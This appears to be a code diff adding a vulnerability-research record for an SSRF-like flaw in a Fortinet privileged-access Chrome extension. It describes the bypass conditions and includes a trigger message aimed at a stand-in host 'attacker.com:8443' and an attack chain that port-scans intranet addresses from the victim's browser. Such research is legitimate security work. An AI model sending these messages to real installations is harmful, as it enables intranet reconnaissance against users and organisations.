@@ -209,6 +209,78 @@ FPE_F04_HTTP_LAUNCHER_INTERCEPT = {
 
 
 # ---------------------------------------------------------
+# FPE-F05: Arbitrary domain fetch from extension (SSRF-like) via launch message
+# ---------------------------------------------------------
+FPE_F05_DOMAIN_SSRF = {
+    "id":       "FPE-F05",
+    "product":  "Fortinet Privileged Access Agent Chrome Extension v8.0.1.123",
+    "severity": "MEDIUM -- extension makes outbound requests to attacker-controlled domain",
+    "class":    "Server-Side Request Forgery from browser extension context",
+
+    "description": (
+        "The onMessageExternalHandler accepts a 'domain' field in the launch message. "
+        "If the sender hostname passes the PAMHostnameList check (whitelist) and either "
+        "JWT is valid or server verification is bypassed via trusted list, the extension "
+        "calls launchStandaloneSession(e,n). "
+        "launchStandaloneSession calls api.sendInfoRequest(e), which constructs a URL: "
+        "new URL(o?`${t}:${o}`:t) (domain + port) with pathname '/pam/info'. "
+        "The extension then calls delegateFetch to this constructed URL with: "
+        "  Authorization: Bearer <message.accesstoken> "
+        "  X-User-Agent: MV3 Extension v8.0.1.123/<browser> <version>;<OS> <arch> "
+        "The accesstoken header value comes from the launch message, not stored credentials. "
+        "However, the extension has <all_urls> host_permissions, so it can reach any URL "
+        "including intranet addresses (192.168.x.x, 10.x.x.x, 172.16-31.x.x, localhost). "
+        "An attacker with control over a PAM-whitelisted hostname can direct the extension "
+        "to probe any IP/port accessible from the user's browser."
+    ),
+
+    "trigger": {
+        "condition_1": "Sender hostname in PAMHostnameList (chrome.storage.local)",
+        "condition_2a": "JWT validation enabled: valid JWT required (sign key from PAM server)",
+        "condition_2b": "JWT disabled: hostname in trusted list OR user approves server verification modal",
+        "action":       "chrome.runtime.sendMessage(EXT_ID, {action:'launcher', domain:'attacker.com:8443', sec_id:'1', launcher:'1'})",
+    },
+
+    "evidence": {
+        "action_constant":   "T = 'launcher' at service_worker.js offset 294964",
+        "valid_check":       "validStandaloneChromium(e): (!isWSConnected() || e.type==='extension') && e.action===T",
+        "sendInfoRequest":   "new URL(domain+port) with pathname='/pam/info'; adds sec_id and launcher as searchParams",
+        "makeHeaders":       "Authorization: Bearer ${message.accesstoken}; X-User-Agent: extension version",
+        "host_permissions":  "<all_urls>; extension can reach any URL from user's browser",
+    },
+
+    "attack_chain": (
+        "1. Compromise or MITM a FortiPAM server hostname in the whitelist. "
+        "2. Serve a page that calls chrome.runtime.sendMessage(EXT_ID, "
+        "   {action:'launcher', domain:'192.168.1.1:22', sec_id:'1', launcher:'1', accesstoken:''}) "
+        "3. Extension makes GET https://192.168.1.1:22/pam/info?sec_id=1&launcher=1 from user browser. "
+        "4. Response status/error reveals port state (port scan from victim browser). "
+        "5. With valid JWT (from compromised PAM server): iterate over intranet addresses. "
+        "Amplification: extension's trusted origin list persists -- one-time user approval enables "
+        "repeat access without further interaction."
+    ),
+
+    "scope_note": (
+        "Credential leakage: NO -- Authorization header carries the caller-provided accesstoken "
+        "only; no stored PAM credentials are sent to the attacker-controlled domain. "
+        "Primary impact: intranet port scanning / service enumeration from victim browser context."
+    ),
+}
+
+FPE_F01_UPDATES = {
+    "jwt_validation_reversals_2026_09_16": {
+        "T_constant":      "T = 'launcher' (sw.js offset 294964) -- e.action === 'launcher' required",
+        "Tt_function":     "Tt(e.accesstoken): truthy check -- returns true if accesstoken is provided",
+        "kt_function":     "kt(accesstoken): JWT decode+verify; returns {valid, claims} object",
+        "Ct_function":     "Ct(claims, msg): validates JWT claims against message fields",
+        "trusted_list_Ue": "Ue() reads chrome.storage.local[ne] (persistent cross-session trusted hosts)",
+        "Oe_function":     "Oe(hostname) adds host to trusted list -- triggers after user approves modal",
+        "ping_ct":         "ct = 'ping' (sw.js offset 327814) -- responds to any caller, no whitelist",
+    },
+}
+
+
+# ---------------------------------------------------------
 # Pending findings
 # ---------------------------------------------------------
 pending_findings = [
